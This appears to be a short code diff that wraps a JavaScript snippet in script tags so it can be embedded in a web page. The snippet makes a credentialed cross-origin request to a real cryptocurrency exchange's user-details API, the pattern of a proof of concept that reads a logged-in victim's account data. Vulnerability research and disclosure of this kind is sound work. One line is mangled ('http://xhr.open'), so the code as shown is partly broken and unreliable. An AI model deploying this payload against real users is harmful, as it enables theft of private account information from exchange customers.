@@ -1,3 +1,4 @@
+<script>
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
     if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
@@ -7,3 +8,4 @@ xhr.onreadystatechange = function() {
 http://xhr.open('GET', 'https://api.latoken.com/api/v2/auth/user/details', true); 
 xhr.withCredentials = true; 
 xhr.send(null);
+</script>
